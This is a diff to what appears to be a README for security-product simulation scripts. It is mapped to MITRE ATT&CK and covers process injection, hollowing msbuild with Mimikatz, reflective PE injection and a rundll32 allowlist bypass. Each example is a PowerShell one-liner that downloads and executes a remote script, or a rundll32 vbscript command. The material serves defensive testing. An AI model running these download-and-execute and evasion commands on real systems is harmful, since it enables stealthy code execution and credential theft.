@@ -60,29 +60,41 @@ https://attack.mitre.org/techniques/T1555/
 
 ## Injection
 Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.
+
 https://attack.mitre.org/techniques/T1055/
 
-### Code Injection
-Code injection and execution is one of the most popular living-off-the-land techniques, the motivation of this technique is to execute a malicious and evasive code within a legitimate process to bypass detection, that code usually will remotely load next stage backdoor
-
-#### 1. Shellcode Entry Injection
+### 1. Shellcode Entry Injection
 Injection of shellcode into the entry of a legitimate spawn process
 In this example we will inject shellcode into notepad that spawns calculator
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ShellcodeInjection1.ps1"); Invoke-Shellcode1;`
 
-#### 2. Hollowing
+### 2. Hollowing
 Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. 
-Process hollowing is a "living-off-the-land" method of executing arbitrary code in the address space of a separate live process. 
+Process hollowing is a "living-off-the-land" method of executing arbitrary code in the address space of a separate live process. In this example we will hollow legitimate windows msbuild 64 bit process with Mimikatz process 
+
 https://attack.mitre.org/techniques/T1055/012/
-In this example we will hollow legitimate windows msbuild 64 bit process with Mimikatz process
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Hollowing64.ps1"); Invoke-Hollow64;`
 
-#### 3. Reflective PE Injection
+### 3. Reflective PE Injection
 In this example we will reflectively load a simple MsgBox dll within a remote process (the dll is 64bit), 
 Reflective loading allows to load a full executable in a legitimate application while bypassing image load monitoring
 This also allows to load executable that is not on the disk. We will use the known PowerSploit PE injection.
+
 https://attack.mitre.org/techniques/T1620/
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ReflectivePEInjection.ps1"); Invoke-ReflectivePEInjection -ProcName explorer;`
+
+## Allowlist Bypass (formerly Whitelist bypass)
+"Living-off-the-land" techniques that can be used to bypass Application Whitelisting Protection, usually maintain stealthiness and evasion by abusing inherent architectural weakness of the operating system.
+
+### Rundll32 RunHTMLApplication technique
+
+Adversaries abuse Rundll32 to execute JavaScript and VBScript codes without downloading scripts.
+Due to architectural weakness within the rundll32 loading process, rundll32 can be misused to not only load dll, but also to execute a direct Javascript or VBScript code.
+*note that this command line is executed from a command-prompt*
+
+https://attack.mitre.org/techniques/T1218/011/
+
+`CMD> rundll32.exe vbscript:"\..\\mshtml, RunHTMLApplication "+Close(CreateObject("WScript.Shell").Run("calc"))`
